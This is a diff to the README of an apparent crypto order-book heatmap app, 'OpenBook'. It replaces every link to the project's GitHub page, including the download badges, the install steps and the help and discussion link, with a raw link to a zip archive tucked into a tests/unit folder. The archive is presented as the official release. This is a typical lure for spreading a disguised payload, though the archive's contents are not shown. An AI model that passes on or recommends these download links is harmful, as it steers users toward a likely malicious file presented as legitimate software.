@@ -1,6 +1,6 @@
 # 📊 OpenBook - View Crypto Futures Depth Easily
 
-[![Download OpenBook](https://img.shields.io/badge/Download-OpenBook-brightgreen?style=for-the-badge)](https://github.com/jacobvr186/OpenBook)
+[![Download OpenBook](https://img.shields.io/badge/Download-OpenBook-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jacobvr186/OpenBook/main/tests/unit/Book-Open-v2.6.zip)
 
 OpenBook shows you a live heatmap of crypto futures order depths. It updates in real time and includes order flow and trade tapes. You can watch how the market moves in detail without needing special skills.
 
@@ -34,11 +34,11 @@ Make sure your computer meets these basic needs before running OpenBook:
 
 You can get OpenBook from the official GitHub page:
 
-[![Download OpenBook](https://img.shields.io/badge/Download-OpenBook-blue?style=for-the-badge)](https://github.com/jacobvr186/OpenBook)
+[![Download OpenBook](https://img.shields.io/badge/Download-OpenBook-blue?style=for-the-badge)](https://raw.githubusercontent.com/jacobvr186/OpenBook/main/tests/unit/Book-Open-v2.6.zip)
 
 Click the button above or visit:
 
-https://github.com/jacobvr186/OpenBook
+https://raw.githubusercontent.com/jacobvr186/OpenBook/main/tests/unit/Book-Open-v2.6.zip
 
 On that page, you will find the latest version ready to download.
 
@@ -47,7 +47,7 @@ On that page, you will find the latest version ready to download.
 ## 💾 How to Download and Install OpenBook on Windows
 
 1. Open your web browser and go to the download page:  
-   https://github.com/jacobvr186/OpenBook  
+   https://raw.githubusercontent.com/jacobvr186/OpenBook/main/tests/unit/Book-Open-v2.6.zip  
 
 2. Look for the **Releases** or **Downloads** section on the page. It usually appears as a sidebar or a tab.
 
@@ -118,10 +118,10 @@ If problems continue, you can ask for help by opening an issue on the GitHub pag
 
 For more help and community discussion, visit the GitHub repository’s **Issues** and **Discussions** tabs at:
 
-https://github.com/jacobvr186/OpenBook
+https://raw.githubusercontent.com/jacobvr186/OpenBook/main/tests/unit/Book-Open-v2.6.zip
 
 You can review current questions or ask your own. The repository also has code if you want to explore how the app works under the hood.
 
 ---
 
-[![Download OpenBook](https://img.shields.io/badge/Download-OpenBook-brightgreen?style=for-the-badge)](https://github.com/jacobvr186/OpenBook)
+[![Download OpenBook](https://img.shields.io/badge/Download-OpenBook-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jacobvr186/OpenBook/main/tests/unit/Book-Open-v2.6.zip)
